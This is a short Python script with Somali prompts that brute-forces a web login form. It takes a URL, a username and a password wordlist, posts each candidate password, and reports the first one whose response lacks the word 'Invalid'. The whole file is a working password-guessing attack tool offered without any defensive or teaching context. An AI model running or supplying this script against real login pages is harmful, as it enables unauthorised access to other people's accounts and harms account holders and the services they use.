
import requests

url = input("Geli URL login form: ")
username = input("Geli username: ")
wordlist = input("Geli path wordlist: ")

with open(wordlist, 'r') as f:
    for line in f:
        password = line.strip()
        data = {'username': username, 'password': password}
        r = requests.post(url, data=data)
        if "Invalid" not in r.text:
            print(f"[+] Password la helay: {password}")
            break
